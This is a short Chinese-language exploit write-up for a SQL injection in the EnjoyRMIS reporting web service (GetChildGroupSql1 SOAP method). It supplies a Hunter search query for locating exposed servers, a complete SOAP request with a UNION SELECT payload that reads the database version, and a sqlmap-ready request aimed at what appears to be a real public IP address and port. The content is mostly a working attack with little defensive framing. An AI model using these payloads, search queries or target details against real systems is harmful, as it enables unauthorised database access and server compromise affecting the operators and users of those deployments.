# EnjoyRMIS GetChildGroupSql1存在SQL注入漏洞

# 一、漏洞简介
EnjoyRMIS GetChildGroupSql1存在SQL注入漏洞,攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。

# 二、影响版本
+ EnjoyRMIS

# 三、资产测绘
+ hunter`web.body="CheckSilverlightInstalled"`
+ 特征

![1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89.png](./img/jWjV8uVque7i9zbw/1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89-060256.png)

# 四、漏洞复现
```plain
POST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetChildGroupSql1"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetChildGroupSql1 xmlns="http://tempuri.org/">
      <sGuid>1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(select @@version),NULL,NULL-- jhpF</sGuid>
    </GetChildGroupSql1>
  </soap:Body>
</soap:Envelope>
```

![1700643625811-3b3425fa-909f-411b-8d72-d46fe7c0c397.png](./img/jWjV8uVque7i9zbw/1700643625811-3b3425fa-909f-411b-8d72-d46fe7c0c397-123468.png)

sqlmap

```plain
POST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1
Host: 120.78.175.218:8008
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetChildGroupSql1"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetChildGroupSql1 xmlns="http://tempuri.org/">
      <sGuid>1</sGuid>
    </GetChildGroupSql1>
  </soap:Body>
</soap:Envelope>
```

![1700643507730-28f5a0db-3d0c-40ea-9e13-8c97909a8163.png](./img/jWjV8uVque7i9zbw/1700643507730-28f5a0db-3d0c-40ea-9e13-8c97909a8163-133965.png)



> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gw589s9zgn0o9yrq>